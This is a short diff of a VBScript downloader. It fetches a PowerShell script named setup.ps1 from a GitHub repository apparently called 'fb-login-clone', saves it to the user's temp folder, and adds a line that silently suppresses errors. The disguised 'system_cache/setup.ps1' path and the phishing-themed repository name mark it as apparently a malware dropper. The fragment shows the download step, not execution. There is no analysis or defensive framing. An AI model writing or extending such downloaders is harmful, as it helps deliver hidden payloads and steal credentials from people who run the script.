@@ -5,6 +5,8 @@ Set stream = CreateObject("ADODB.Stream")
 url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache/setup.ps1"
 dest = shell.ExpandEnvironmentStrings("%TEMP%\setup.ps1")
 
+On Error Resume Next
+
 http.Open "GET", url, False
 http.Send
 
